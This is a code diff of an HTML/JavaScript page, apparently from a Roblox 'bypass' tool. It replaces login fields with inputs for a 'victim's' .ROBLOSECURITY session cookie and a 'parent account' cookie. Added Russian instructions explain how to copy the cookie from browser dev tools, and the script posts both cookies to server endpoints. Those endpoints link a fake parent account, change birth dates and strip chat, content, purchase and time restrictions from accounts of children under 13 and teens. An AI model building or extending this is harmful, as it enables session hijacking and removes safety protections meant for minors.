@@ -2,16 +2,16 @@
 
 {% block content %}
 <div class="card">
-    <h2>🔓 Bypass Tools</h2>
-    <p>Обход ограничений для Roblox аккаунтов</p>
+    <h2>🔓 Bypass Systems</h2>
+    <p>Обход ограничений через родительские аккаунты</p>
     
     <div class="bypass-section">
         <h3>🎯 Bypass 13- Accounts</h3>
-        <p class="section-description">Для аккаунтов младше 13 лет - снимает чат ограничения и фильтры контента</p>
+        <p class="section-description">Для аккаунтов младше 13 лет - снятие ограничений через родительский аккаунт</p>
         
         <div class="input-group">
-            <input type="text" id="username-13minus" class="neon-input" placeholder="Username">
-            <input type="password" id="password-13minus" class="neon-input" placeholder="Password">
+            <input type="text" id="victim-cookies-13minus" class="neon-input" placeholder="Куки жертвы (.ROBLOSECURITY)">
+            <input type="text" id="parent-cookies-13minus" class="neon-input" placeholder="Куки родительского аккаунта">
         </div>
         <button class="neon-button" onclick="bypass13Minus()">
             🚀 Bypass 13-
@@ -21,11 +21,11 @@
     
     <div class="bypass-section">
         <h3>🎯 Bypass 13-17 Accounts</h3>
-        <p class="section-description">Для аккаунтов 13-17 лет - снимает ограничения по времени и покупкам</p>
+        <p class="section-description">Для аккаунтов 13-17 лет - снятие ограничений по покупкам и времени</p>
         
         <div class="input-group">
-            <input type="text" id="username-1317" class="neon-input" placeholder="Username">
-            <input type="password" id="password-1317" class="neon-input" placeholder="Password">
+            <input type="text" id="victim-cookies-1317" class="neon-input" placeholder="Куки жертвы (.ROBLOSECURITY)">
+            <input type="text" id="parent-cookies-1317" class="neon-input" placeholder="Куки родительского аккаунта">
         </div>
         <button class="neon-button" onclick="bypass1317()">
             🚀 Bypass 13-17
@@ -34,24 +34,53 @@
     </div>
 </div>
 
+<div class="card">
+    <h3>📝 Инструкция по использованию</h3>
+    <div class="instructions">
+        <p><strong>1. Получение куки:</strong></p>
+        <ul>
+            <li>Зайдите на Roblox.com</li>
+            <li>Откройте Developer Tools (F12)</li>
+            <li>Перейдите в Application/Storage → Cookies</li>
+            <li>Скопируйте значение .ROBLOSECURITY</li>
+        </ul>
+        
+        <p><strong>2. Родительский аккаунт:</strong></p>
+        <ul>
+            <li>Должен быть старше 13 лет</li>
+            <li>Должен иметь подтвержденную почту</li>
+            <li>Не должен быть ограничен</li>
+        </ul>
+        
+        <p><strong>3. Процесс bypass:</strong></p>
+        <ul>
+            <li>Система автоматически отправляет запрос на привязку</li>
+            <li>Подтверждает через родительский аккаунт</li>
+            <li>Изменяет дату рождения/ограничения</li>
+            <li>Отвязывает родительский аккаунт</li>
+        </ul>
+    </div>
+</div>
+
 <script>
 function bypass13Minus() {
-    const username = document.getElementById('username-13minus').value;
-    const password = document.getElementById('password-13minus').value;
+    const victimCookies = document.getElementById('victim-cookies-13minus').value;
+    const parentCookies = document.getElementById('parent-cookies-13minus').value;
     const resultDiv = document.getElementById('result-13minus');
     
-    if (!username || !password) {
+    if (!victimCookies || !parentCookies) {
         resultDiv.innerHTML = '<div class="result-item result-invalid">Заполните все поля!</div>';
         return;
     }
     
-    resultDiv.innerHTML = '<p>🔄 Выполняем bypass... Подождите</p>';
+    resultDiv.innerHTML = '<p>🔄 Выполняем bypass... Это может занять несколько минут</p>';
     
     fetch('/api/bypass_13_minus', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({
-            credentials: {username, password}
+            victim_cookies: victimCookies,
+            parent_data: {cookies: parentCookies}
         })
     })
     .then(response => response.json())
@@ -67,12 +96,10 @@ function bypass13Minus() {
                         <div class="privileges-list">
                             <strong>Удаленные ограничения:</strong>
                             <ul>
-                                ${data.restrictions_removed.map(item => `<li>${item}</li>`).join('')}
+                                ${data.details.restrictions_removed.map(item => `<li>${item}</li>`).join('')}
                             </ul>
-                            <strong>Новые привилегии:</strong>
-                            <ul>
-                                ${data.new_privileges.map(item => `<li>${item}</li>`).join('')}
-                            </ul>
+                            <strong>Родительский аккаунт:</strong>
+                            <p>${data.details.parent_account}</p>
                         </div>
                     </div>
                 </div>
@@ -93,22 +120,23 @@ function bypass13Minus() {
 }
 
 function bypass1317() {
-    const username = document.getElementById('username-1317').value;
-    const password = document.getElementById('password-1317').value;
+    const victimCookies = document.getElementById('victim-cookies-1317').value;
+    const parentCookies = document.getElementById('parent-cookies-1317').value;
     const resultDiv = document.getElementById('result-1317');
     
-    if (!username || !password) {
+    if (!victimCookies || !parentCookies) {
         resultDiv.innerHTML = '<div class="result-item result-invalid">Заполните все поля!</div>';
         return;
     }
     
-    resultDiv.innerHTML = '<p>🔄 Выполняем bypass... Подождите</p>';
+    resultDiv.innerHTML = '<p>🔄 Выполняем bypass... Это может занять несколько минут</p>';
     
     fetch('/api/bypass_13_17', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({
-            credentials: {username, password}
+            victim_cookies: victimCookies,
+            parent_data: {cookies: parentCookies}
         })
     })
     .then(response => response.json())
@@ -124,11 +152,11 @@ function bypass1317() {
                         <div class="privileges-list">
                             <strong>Удаленные ограничения:</strong>
                             <ul>
-                                ${data.restrictions_removed.map(item => `<li>${item}</li>`).join('')}
+                                ${data.details.restrictions_removed.map(item => `<li>${item}</li>`).join('')}
                             </ul>
                             <strong>Новые привилегии:</strong>
                             <ul>
-                                ${data.new_privileges.map(item => `<li>${item}</li>`).join('')}
+                                ${data.details.new_privileges.map(item => `<li>${item}</li>`).join('')}
                             </ul>
                         </div>
                     </div>
@@ -149,4 +177,23 @@ function bypass1317() {
     });
 }
 </script>
+
+<style>
+.instructions {
+    background: rgba(255, 255, 255, 0.05);
+    padding: 1.5rem;
+    border-radius: 8px;
+    border: 1px solid var(--neon-blue);
+}
+
+.instructions ul {
+    margin: 0.5rem 0;
+    padding-left: 1.5rem;
+}
+
+.instructions li {
+    margin: 0.25rem 0;
+    color: var(--text-muted);
+}
+</style>
 {% endblock %}
